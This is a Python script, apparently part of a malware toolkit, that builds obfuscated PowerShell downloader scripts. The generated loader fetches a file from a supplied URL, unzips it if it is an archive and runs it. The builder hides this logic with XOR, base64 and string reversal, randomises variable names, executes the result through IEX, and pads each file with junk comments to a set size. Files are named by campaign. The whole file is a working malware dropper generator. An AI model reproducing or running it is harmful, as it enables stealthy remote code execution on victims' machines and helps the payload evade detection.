# payload_builder.py

import base64
import random
import string
from pathlib import Path

def generate_random_var(length=8):
    return ''.join(random.choices(string.ascii_lowercase, k=length))

def xor_encrypt(s: str, key: int) -> str:
    return ''.join(chr(ord(c) ^ key) for c in s)

def generate_payload_text(payload_url: str,
                          payload_name: str,
                          campaign_id: str,
                          min_size_kb: int = 100,
                          max_size_kb: int = 120) -> int:
    """
    Generates an obfuscated PowerShell script that downloads and runs payload_name from payload_url.
    Output is a .txt file containing the loader in dante_v3_final style.
    """

    # 1. PowerShell logic
    core_code = (
        f"$n='{payload_name}';"
        f"$u='{payload_url}';"
        f"$dld=$env:TEMP+'\\\\'+[IO.Path]::GetFileName($u);"
        f"(New-Object Net.WebClient).DownloadFile($u,$dld);"
        f"if ($dld -like '*.zip') {{"
            f"Add-Type -AssemblyName System.IO.Compression.FileSystem;"
            f"$exdir=$env:TEMP+'\\\\'+[IO.Path]::GetFileNameWithoutExtension($dld);"
            f"[IO.Compression.ZipFile]::ExtractToDirectory($dld,$exdir);"
            f"$p=$exdir+'\\\\'+$n;"
        f"}} else {{"
            f"$p=$dld;"
        f"}};"
        f"Start-Process $p"
    )

    # 2. Obfuscation: XOR → Base64 → Reverse
    xor_key = random.randint(30, 127)
    xored = xor_encrypt(core_code, xor_key)
    b64 = base64.b64encode(xored.encode('latin1')).decode()
    reversed_b64 = b64[::-1]

    # 3. Variable names
    k = generate_random_var()
    s = generate_random_var()
    b = generate_random_var()
    c = generate_random_var()
    o = generate_random_var()

    # 4. Obfuscated PowerShell code
    lines = [
        f"${k}={xor_key}",
        f"${s}=\"{reversed_b64}\"",
        f"${b}=(${s}[-1..-${s}.Length]-join'')",
        f"${b}=[System.Convert]::FromBase64String(${b})",
        f"${o}='';foreach(${c} in ${b}){{${o}+=[char]([byte]${c}-bxor${k})}}",
        f"IEX ${o}"
    ]

    # 5. Add junk lines to reach desired size
    target_size = random.randint(min_size_kb * 1024, max_size_kb * 1024)
    junk_line = lambda: f"# {''.join(random.choices(string.ascii_letters + string.digits, k=60))}"
    while len("\n".join(lines).encode()) < target_size:
        lines.append(junk_line())

    # Save output
    output_dir = Path("tmp_payloads")
    output_dir.mkdir(exist_ok=True)
    file_path = output_dir / f"{campaign_id}.txt"
    with open(file_path, "w", encoding="utf-8") as f:
        f.write("\n".join(lines))

    return str(file_path)

    return xor_key
